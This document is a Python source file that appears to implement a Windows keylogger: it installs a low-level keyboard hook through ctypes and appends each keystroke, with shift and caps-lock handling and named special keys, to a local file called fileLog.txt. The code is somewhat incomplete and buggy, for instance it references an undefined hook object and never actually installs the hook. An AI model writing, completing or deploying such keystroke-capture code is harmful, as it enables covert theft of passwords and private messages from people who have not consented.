from ctypes import *
from ctypes import wintypes
from os import times
import threading
  
user32 = WinDLL("user32", use_last_error=True)
kernel32 = WinDLL("kernel32", use_last_error=True)
kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
user32.SetWindowsHookExA.argtypes = (c_int, wintypes.HANDLE, wintypes.HMODULE, wintypes.DWORD)
hooked = None

VK_CODE = {'Cancel':0x03,
           'Backspace':0x08,
           'Tab':0x09,
           'Clear':0x0C,
           'Enter':0x0D,
           'Shift':0x10,
           'Ctrl':0x11,
           'Alt':0x12,
           'Pause':0x13, 
           'Caps_lock':0x14,
           'Esc':0x1B,
           'Spacebar':0x20, #
           'Page_up':0x21, 
           'Page_down':0x22,
           'End':0x23,
           'Home':0x24,
           'Left_arrow':0x25,
           'Up_arrow':0x26,
           'Right_arrow':0x27,
           'Down_arrow':0x28,
           'Select':0x29,
           'Print':0x2A,
           'Execute':0x2B,
           'Print_screen':0x2C,
           'Ins':0x2D,
           'Del':0x2E,
           'Help':0x2F,
           'F1':0x70,
           'F2':0x71,
           'F3':0x72,
           'F4':0x73,
           'F5':0x74,
           'F6':0x75,
           'F7':0x76,
           'F8':0x77,
           'F9':0x78,
           'F10':0x79,
           'F11':0x7A,
           'F12':0x7B,
           'F13':0x7C,
           'F14':0x7D,
           'F15':0x7E,
           'F16':0x7F,
           'F17':0x80,
           'F18':0x81,
           'F19':0x82,
           'F20':0x83,
           'F21':0x84,
           'F22':0x85,
           'F23':0x86,
           'F24':0x87,
           'Num_lock':0x90,
           'Scroll_lock':0x91,
           'Left_shift':0xA0,
           'Right_shift':0xA1,
           'Left_control':0xA2,
           'Right_control':0xA3,
           'Left_menu':0xA4,
           'Right_menu':0xA5,
           'Browser_back':0xA6,
           'Browser_forward':0xA7,
           'Browser_refresh':0xA8,
           'Browser_stop':0xA9,
           'Browser_search':0xAA,
           'Browser_favorites':0xAB,
           'Browser_start_and_home':0xAC,
           'Volume_mute':0xAD,
           'Volume_Down':0xAE,
           'Volume_up':0xAF,
           'Next_track':0xB0,
           'Previous_track':0xB1,
           'Stop_media':0xB2,
           'Play/pause_media':0xB3,
           'Start_mail':0xB4,
           'Select_media':0xB5,
           'Start_application_1':0xB6,
           'Start_application_2':0xB7,
           'Attn_key':0xF6,
           'Crsel_key':0xF7,
           'Exsel_key':0xF8,
           'Play_key':0xFA,
           'Zoom_key':0xFB,
           'Clear_key':0xFE,
}


WH_KEYBOARD_LL = 13 
WM_KEYDOWN = 0x0100
HC_ACTION = 0

isStop = False
isKill = False

FilLogPath = "fileLog.txt"

class KeyHook(threading.Thread):
    def __init__(self):
        self.user32 = user32
        self.kernel32 = kernel32
        #self.hooked = None
    
    def installHookProc(self,pointer):
        global hooked
        if(hooked != None):
            return False
        hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not hooked:
            return False
        return True
    
    def unistallHookProc(self):
        global hooked
        if hooked is None:
            return
        user32.UnhookWindowsHookEx(hooked)
        hooked = None

def hookProc(nCode, wParam, lParam):
    global kh
    global hooked
    #if isStop: 
    #    return user32.CallNextHookEx(hooked, nCode, wParam,  lParam)
    if nCode == HC_ACTION and wParam == WM_KEYDOWN:
        fileLog = open(FilLogPath,"a")
        capsLock = user32.GetKeyState(VK_CODE["Caps_lock"])
        shift = user32.GetAsyncKeyState(VK_CODE["Shift"])
        shift = user32.GetAsyncKeyState(VK_CODE["Shift"])
        KeyCode = lParam.contents.value
        if KeyCode>0:
            if KeyCode == VK_CODE["Spacebar"]:
                fileLog.write(" ") 
            elif KeyCode == VK_CODE["Enter"]:
                fileLog.write("\n")
            elif chr(KeyCode) == "0":
                if shift: fileLog.write(")")
                else: fileLog.write("0")
            elif chr(KeyCode) == "1":
                if shift: fileLog.write("!")
                else: fileLog.write("1")
            elif chr(KeyCode) == "2":
                if shift: fileLog.write("@")
                else: fileLog.write("2")
            elif chr(KeyCode) == "3":
                if shift: fileLog.write("#")
                else: fileLog.write("3")
            elif chr(KeyCode) == "4":
                if shift: fileLog.write("$")
                else: fileLog.write("4")
            elif chr(KeyCode) == "5":
                if shift: fileLog.write("%")
                else: fileLog.write("5")
            elif chr(KeyCode) == "6":
                if shift: fileLog.write("^")
                else: fileLog.write("6")
            elif chr(KeyCode) == "7":
                if shift: fileLog.write("&")
                else: fileLog.write("7")
            elif chr(KeyCode) == "8":
                if shift: fileLog.write("*")
                else: fileLog.write("8")
            elif chr(KeyCode) == "9":
                if shift: fileLog.write("(")
                else: fileLog.write("9")
            elif chr(KeyCode) == ",":
                if shift: fileLog.write("<")
                else: fileLog.write(",")
            elif chr(KeyCode) == ".":
                if shift: fileLog.write(">")
                else: fileLog.write(".")
            elif chr(KeyCode) == "/":
                if shift: fileLog.write("?")
                else: fileLog.write("/")
            elif chr(KeyCode) == ";":
                if shift: fileLog.write(":")
                else: fileLog.write(";")
            elif chr(KeyCode) == "'":
                if shift: fileLog.write("\"")
                else: fileLog.write("'")
            elif chr(KeyCode) == "[":
                if shift: fileLog.write("{")
                else: fileLog.write("[")
            elif chr(KeyCode) == "]":
                if shift: fileLog.write("}")
                else: fileLog.write("]")
            elif chr(KeyCode) == "\\":
                if shift: fileLog.write("|")
                else: fileLog.write("\\")
            elif chr(KeyCode) == "-":
                if shift: fileLog.write("_")
                else: fileLog.write("-")
            elif chr(KeyCode) == "=":
                if shift: fileLog.write("+")
                else: fileLog.write("=")
            elif KeyCode in VK_CODE.values():
                if KeyCode == VK_CODE["Shift"] or KeyCode == VK_CODE["Left_shift"] or KeyCode == VK_CODE["Right_shift"]:
                    fileLog.write("")
                else:
                    for key, value in VK_CODE.items():
                        if KeyCode == value:
                            fileLog.write(key)
            else:
                if capsLock:
                    if shift: fileLog.write(chr(KeyCode).lower())
                    else: fileLog.write(chr(KeyCode).upper())
                else:
                    if shift:  fileLog.write(chr(KeyCode).upper())
                    else: fileLog.write(chr(KeyCode).lower())
            
        fileLog.close()         
    return user32.CallNextHookEx(hooked, nCode, wParam,  lParam)


